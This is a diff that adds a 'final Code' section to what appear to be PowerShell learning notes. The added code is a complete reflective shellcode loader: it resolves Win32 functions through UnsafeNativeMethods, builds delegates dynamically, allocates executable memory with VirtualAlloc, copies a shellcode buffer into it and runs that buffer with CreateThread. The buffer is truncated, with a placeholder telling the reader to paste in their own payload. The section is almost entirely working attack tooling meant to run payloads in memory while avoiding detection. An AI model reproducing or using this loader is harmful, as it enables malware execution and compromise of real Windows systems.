@@ -315,3 +315,65 @@ $MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPo
 
 # Invoke the delegate
 $MyFunction.Invoke([IntPtr]::Zero, "Hello world", "This is my MessageBox", 0)
+
+
+
+
+
+final Code
+----------
+
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |  
+        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {
+        If($_.Name -eq "GetProcAddress") {
+            $tmp+=$_
+        }
+    }
+    
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [Type[]] $func,
+        [Type] $delType = [Void]
+    )
+
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),  
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+    return $type.CreateType()
+}
+
+# Allocate memory and copy shellcode
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc 'kernel32.dll' 'VirtualAlloc'),
+    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...  # Replace this with your actual shellcode bytes
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)
+
+# Create a thread for shellcode execution
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc 'kernel32.dll' 'CreateThread'),
+    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+# Wait for the thread to finish execution
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc 'kernel32.dll' 'WaitForSingleObject'),
+    (getDelegateType @([IntPtr], [Int32]) ([Int]))
+).Invoke($hThread, 0xFFFFFFFF)
+
